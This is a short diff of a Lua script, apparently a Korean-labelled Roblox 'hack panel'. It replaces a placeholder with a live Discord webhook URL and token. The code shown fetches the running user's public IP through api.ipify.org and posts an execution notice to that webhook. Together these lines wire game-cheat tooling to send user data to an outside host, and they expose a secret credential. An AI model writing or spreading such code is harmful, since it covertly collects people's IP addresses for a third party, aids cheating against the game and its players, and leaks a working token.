@@ -1509,7 +1509,7 @@ pcall(function() ip = game:HttpGet("https://api.ipify.org") end)
 local startTime = os.date("%Y-%m-%d %H:%M:%S")
 
 -- 웹훅 전송
-sendWebhook("여기에_웹훅_URL", {
+sendWebhook("https://discord.com/api/webhooks/1556235892736262195/puGGv6VifTfxSplfGDM8xsvonWT-YhbN7W6ME67qcf6ivZzl3KOefBx4TTALcL4fXIKm", {
     content = "**스크립트 실행**",
     embeds = {{
         title = "왕웨이 핵패널 실행됨",
